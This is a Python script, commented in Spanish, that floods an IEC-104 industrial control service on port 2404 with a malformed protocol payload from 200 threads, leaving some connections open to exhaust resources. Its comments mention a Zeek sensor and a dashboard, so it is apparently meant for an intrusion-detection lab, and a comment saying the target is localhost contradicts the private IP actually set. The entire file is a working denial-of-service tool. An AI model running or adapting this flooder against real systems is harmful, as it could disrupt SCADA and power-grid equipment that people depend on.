import socket
import threading
import time
import random
import sys

# --- CONFIGURACIÓN ---
# Como Zeek está escuchando en 'lo' (Loopback), atacamos al localhost.
# Esto asegura que el tráfico pase por donde Zeek está mirando.
TARGET_IP = "192.168.5.103" 
TARGET_PORT = 2404
HILOS = 200  # Cantidad de atacantes simultáneos (AJUSTA SI TU PC SE CONGELA)

# Payload malicioso: Cabecera IEC-104 válida (0x68) pero cuerpo basura para confundir al parser
PAYLOAD = b'\x68\x04\x07\x00\x00\x00' * 5 

running = True

def flood_attack(thread_id):
    """
    Intenta abrir conexiones y mandar basura lo más rápido posible.
    """
    global running
    paquetes_enviados = 0
    
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5) # Timeout rápido
            s.connect((TARGET_IP, TARGET_PORT))
            
            # Enviamos basura rápida
            s.send(PAYLOAD)
            # A veces cerramos rápido, a veces dejamos abierta para agotar recursos
            if random.random() > 0.5:
                s.close()
            
            paquetes_enviados += 1
            # Imprimir solo cada ciertos paquetes para no saturar la consola
            if paquetes_enviados % 50 == 0:
                print(f"🔥 [Hilo {thread_id}] Flood activo... ({paquetes_enviados} pkts)")
                
        except ConnectionRefusedError:
            pass # Es normal si tumbamos el servicio
        except Exception:
            pass
        
        # Pequeña pausa aleatoria para que parezca tráfico humano muy rápido
        # time.sleep(0.01) 

def main():
    print(f"\n🚀 INICIANDO FLOOD DoS IEC-104 contra {TARGET_IP}:{TARGET_PORT}")
    print(f"⚠️  Zeek debe estar escuchando en la interfaz 'lo'")
    print(f"💣 Lanzando {HILOS} hilos de ataque...")
    
    threads = []
    
    try:
        for i in range(HILOS):
            t = threading.Thread(target=flood_attack, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            
        print("\n✅ ATAQUE EN CURSO. Presiona CTRL+C para detener.")
        
        # Mantener el script vivo
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n\n🛑 DETENIENDO ATAQUE...")
        global running
        running = False
        print("✅ Ataque finalizado. Revisa tu Dashboard.")
        sys.exit()

if __name__ == "__main__":
    main()